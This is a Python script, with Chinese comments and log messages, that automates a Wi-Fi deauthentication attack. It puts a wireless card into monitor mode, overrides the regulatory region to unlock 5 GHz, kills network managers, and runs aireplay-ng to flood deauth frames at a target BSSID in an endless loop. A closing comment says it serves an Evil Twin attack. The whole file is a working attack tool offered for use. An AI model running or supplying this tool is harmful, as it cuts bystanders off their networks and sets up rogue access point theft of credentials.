import argparse
import subprocess
import time
import os
import sys

# 确保能找到 iw, ip, aireplay-ng 等工具
os.environ["PATH"] += os.pathsep + "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"


def run_cmd(cmd):
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def log(msg):
    print(f"[Deauth] {msg}")
    sys.stdout.flush()


def setup_monitor(interface, channel):
    log(f"正在配置网卡 {interface} -> 监听模式 (Channel {channel})...")

    # 杀掉干扰进程
    run_cmd("killall wpa_supplicant NetworkManager dhclient")

    # 解锁区域限制，允许使用 5G 高频段
    run_cmd("iw reg set US")

    # 设置 Monitor 模式
    run_cmd(f"ip link set {interface} down")
    run_cmd(f"iw dev {interface} set type monitor")
    run_cmd(f"ip link set {interface} up")

    # 强力锁频 (尝试多次)
    # iwconfig 对 5G 支持不好，必须用 iw
    for _ in range(3):
        run_cmd(f"iw dev {interface} set channel {channel}")
        time.sleep(0.2)


def attack_deauth(bssid, interface, channel, duration):
    # 最后一次锁频确认
    run_cmd(f"iw dev {interface} set channel {channel}")

    log(f"🔥 开始攻击目标: {bssid} (CH:{channel})")
    log(f"🔥 攻击强度: 无限循环 (直到手动停止)")

    # -D: 禁用 AP 探测 (强制攻击)
    # --ignore-negative-one: 修复报错
    # -0 0: 无限攻击
    cmd = [
        "aireplay-ng",
        "--ignore-negative-one",
        "-D",
        "-0", "0",
        "-a", bssid,
        interface
    ]

    process = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    start_time = time.time()

    try:
        while True:
            # 如果 duration > 0 则检查超时 (0为无限)
            if duration > 0 and (time.time() - start_time) > duration:
                break

            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            if line:
                line = line.strip()
                # 只打印关键日志
                if "Sending" in line and "DeAuth" in line:
                    print(f"[Attack] ⚡ 命中目标! 正在踢人 (CH:{channel})")
                elif "Waiting for beacon" in line:
                    # 如果找不到信号，尝试自动校准信道
                    run_cmd(f"iw dev {interface} set channel {channel}")
                    print(f"[Search] 信号丢失，正在重新锁频...")
                elif "No such device" in line:
                    print(f"[Error] 网卡设备丢失")
                    break

            sys.stdout.flush()

    except KeyboardInterrupt:
        log("攻击被用户终止")
    finally:
        process.terminate()
        run_cmd("killall aireplay-ng")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("mode")
    parser.add_argument("--bssid", required=True)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--channel", default="1")
    parser.add_argument("--duration", default="0")
    args = parser.parse_args()

    setup_monitor(args.interface, args.channel)

    if args.mode == "deauth":
        attack_deauth(args.bssid, args.interface, args.channel, int(args.duration))
    # handshake 模式逻辑此处省略，Evil Twin 只需 deauth